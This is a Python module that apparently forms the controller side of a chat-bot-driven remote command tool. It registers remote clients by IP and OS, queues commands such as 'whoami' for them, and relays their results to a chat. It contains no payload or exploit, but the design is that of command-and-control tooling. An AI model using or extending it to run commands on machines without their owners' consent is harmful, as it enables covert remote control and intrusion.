"""Client manager for tracking multiple remote clients.

This module provides a lightweight in-memory registry of connected
clients and a simple queuing mechanism for commands destined to each
client. It is intentionally simple and synchronous to keep the demo
code easy to follow.
"""

import time
from datetime import datetime


class ClientManager:
    """Manage client registrations, command queues and status.

    Usage:
        manager = ClientManager()
        manager.register_client('client1', ip='1.2.3.4', os_info='Windows')
        manager.queue_command('client1', 'whoami', chat_id)
        pending = manager.get_pending_commands('client1')
    """

    def __init__(self):
        # clients: client_id -> metadata dict
        self.clients = {}
        # default client id for one-click operations
        self.default_client = None
        # command_queue: client_id -> list of pending command dicts
        self.command_queue = {}

    def register_client(self, client_id, ip=None, os_info=None):
        """Register a new client or update existing client's last_seen.

        Returns True when a new client was created, False when updated.
        """
        if client_id not in self.clients:
            self.clients[client_id] = {
                'id': client_id,
                'ip': ip or 'N/A',
                'os': os_info or 'Unknown',
                'status': 'online',
                'last_seen': datetime.now().isoformat()
            }
            self.command_queue[client_id] = []
            return True
        else:
            # Refresh heartbeat information
            self.clients[client_id]['last_seen'] = datetime.now().isoformat()
            self.clients[client_id]['status'] = 'online'
            return False

    def get_client(self, client_id):
        """Return metadata dict for a client or None if unknown."""
        return self.clients.get(client_id)

    def list_clients(self):
        """Return a list of registered clients (shallow copies)."""
        return list(self.clients.values())

    def set_default_client(self, client_id):
        """Set a default client used by convenience commands."""
        if client_id in self.clients:
            self.default_client = client_id
            return True
        return False

    def get_default_client(self):
        """Return the default client id or None."""
        return self.default_client

    def queue_command(self, client_id, command, chat_id):
        """Enqueue a command for a specific client.

        Each queued item includes the chat_id so the client can post
        its result back to the appropriate chat.
        """
        if client_id not in self.command_queue:
            self.command_queue[client_id] = []
        self.command_queue[client_id].append({
            'command': command,
            'chat_id': chat_id,
            'timestamp': time.time()
        })

    def get_pending_commands(self, client_id):
        """Pop and return pending commands for a client as a list."""
        if client_id in self.command_queue:
            commands = self.command_queue[client_id]
            self.command_queue[client_id] = []
            return commands
        return []

    def handle_client_message(self, client_id, message, chat_id, bot):
        """Process a message coming from a client (REGISTER/RESULT/HEARTBEAT)."""
        if message.startswith('REGISTER:'):
            parts = message[9:].split('|')
            ip = parts[0] if len(parts) > 0 else None
            os_info = parts[1] if len(parts) > 1 else None
            self.register_client(client_id, ip, os_info)
            bot.sendMessage(chat_id, f'✅ Client registered: `{client_id}`')

        elif message.startswith('RESULT:'):
            # Client reporting back command execution result
            result = message[7:]
            bot.sendMessage(chat_id, f'📊 `{client_id}`:\n```\n{result}\n```', parse_mode='Markdown')

        elif message.startswith('HEARTBEAT:'):
            # Refresh heartbeat
            if client_id in self.clients:
                self.clients[client_id]['last_seen'] = datetime.now().isoformat()
                self.clients[client_id]['status'] = 'online'

    def execute_command(self, client_id, command, chat_id, bot):
        """Send a command to a client by enqueuing it and notifying the chat.

        Returns True on success, False if client not found.
        """
        if client_id not in self.clients:
            bot.sendMessage(chat_id, f'[!] Client not found: {client_id}')
            return False

        self.queue_command(client_id, command, chat_id)
        bot.sendMessage(chat_id, f'📤 Command sent to `{client_id}`')
        return True